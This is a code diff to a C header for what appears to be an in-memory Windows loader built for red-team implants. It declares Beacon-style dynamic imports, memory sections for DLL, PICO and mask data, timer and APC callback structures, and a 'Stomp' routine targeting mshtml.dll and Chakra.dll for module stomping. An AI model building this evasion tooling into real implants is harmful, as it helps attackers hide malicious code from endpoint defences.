@@ -1,3 +1,4 @@
+#pragma once
 #include <windows.h>
 #include "tcg.h"
 
@@ -16,6 +17,8 @@ DECLSPEC_IMPORT BOOL    KERNEL32$CreateTimerQueueTimer(PHANDLE, HANDLE, WAITORTI
 DECLSPEC_IMPORT BOOL    KERNEL32$DeleteTimerQueue(HANDLE);
 DECLSPEC_IMPORT HANDLE  KERNEL32$CreateEventA(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
 DECLSPEC_IMPORT BOOL    KERNEL32$SetEvent(HANDLE);
+DECLSPEC_IMPORT HANDLE  KERNEL32$CreateWaitableTimerA(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
+DECLSPEC_IMPORT BOOL    KERNEL32$SetWaitableTimer(HANDLE, const LARGE_INTEGER*, LONG, PTIMERAPCROUTINE, LPVOID, BOOL);
 // GetLastError from kernel32.dll for error handling
 DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError ( void );
 DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
@@ -24,18 +27,12 @@ DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryExA(LPCSTR, HANDLE, DWORD);
 // Printf from msvcrt.dll
 DECLSPEC_IMPORT int __cdecl MSVCRT$printf ( const char *, ... );
 DECLSPEC_IMPORT void * __cdecl MSVCRT$memset ( void *, int, size_t );
+DECLSPEC_IMPORT void * __cdecl MSVCRT$memcpy ( void *, const void *, size_t );
 
 
 char _DLL_ [0] __attribute__ ( ( section ( "dll" ) ) );
-
 char _PICO_ [ 0 ] __attribute__ ( ( section ( "pico" ) ) );
-
 char _MASK_  [0] __attribute__ ( ( section ( "mask"  ) ) );
-
-typedef struct {
-    char data [ 4096 ];
-    char code [ 16384 ];
-} PICO;
 
 typedef struct {
     int  len;
@@ -46,20 +43,32 @@ typedef struct {
 	char * picData;
 	DWORD  picSize;
 } PIC_CLEANUP_CTX;
+
 typedef struct {
-    void (*fn)(void);
-    HANDLE evt;
-} TIMER_CTX;
+    void (*fn)();
+    HANDLE event;
+} APC_CALLBACK_CTX;
+
+typedef struct _PICO {
+	char data [ 4096 ];
+	char code [ 16384 ];
+} PICO;
+
 
 typedef void (WINAPI* _GetVersions)();
 
 int __tag_setup_hooks ( );
 int __tag_set_image_info ( );
+int __tag_Stomp( );
 
 typedef void ( * SETUP_HOOKS ) ( IMPORTFUNCS * funcs );
 typedef void ( * SET_IMAGE_INFO ) ( PVOID base, DWORD size );
 
 #define GETRESOURCE(x) ( char * ) &x
+
+// Stomp DLL DEFINES
+#define PICO_STOMP_DLL "mshtml.dll"
+#define DLL_STOMP_DLL "Chakra.dll"
 
 void* GetExport(char* base, const char* name) {
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
